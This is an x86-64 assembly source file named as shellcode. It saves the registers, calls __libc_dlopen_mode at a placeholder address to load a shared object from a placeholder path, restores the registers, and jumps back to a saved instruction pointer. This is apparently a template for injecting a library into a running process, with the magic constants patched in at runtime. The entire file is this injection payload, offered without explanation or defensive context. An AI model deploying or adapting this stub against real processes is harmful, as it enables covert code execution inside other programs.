#define MAGIC_SO_PATH 0x1234567890abcdea
#define MAGIC_PREV_IP_FIRST_HALF 0x12345678
#define MAGIC_PREV_IP_SECOND_HALF 0x12345678
#define MAGIC_SO_LOAD_FUNCTION 0x1234567890abcded

#define RTLD_NOW  0x00002 
        .text
        .align 16
        .global shellcode
        .global end_of_shellcode
shellcode:
        # call __libc_dlopen_mode and pssing parameters
     	pushq %rax
        pushq %rcx
        pushq %rdx
        pushq %rdi
        pushq %rsi
        pushq %rsp
        pushq %r8
        pushq %r9
        pushq %r10
        pushq %r11

        movq $MAGIC_SO_LOAD_FUNCTION, %rax
        movq $MAGIC_SO_PATH, %rdi 
        movq $RTLD_NOW, %rsi
        callq *%rax

        popq %r11
        popq %r10
        popq %r9
        popq %r8
        popq %rsp
        popq %rsi
        popq %rdi
        popq %rdx
        popq %rcx
        popq %rax

        pushq $MAGIC_PREV_IP_FIRST_HALF
        pushq $MAGIC_PREV_IP_SECOND_HALF
        ret
        
end_of_shellcode:
        .end
